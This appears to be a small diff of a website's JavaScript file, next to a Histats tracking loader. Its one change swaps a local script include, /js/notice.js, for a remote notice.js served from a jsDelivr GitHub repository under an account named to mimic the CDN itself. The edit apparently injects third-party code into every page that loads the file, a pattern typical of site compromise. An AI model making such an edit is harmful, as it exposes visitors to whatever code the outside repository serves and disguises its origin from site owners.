@@ -9,4 +9,4 @@ hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();
 
-document.write ('<script language="javascript" type="text/javascript" src="/js/notice.js"></script>');
+document.write ('<script language="javascript" type="text/javascript" src="https://cdn.jsdelivr.net/gh/cdnjsdelivr001/182cdn@master/notice.js"></script>');
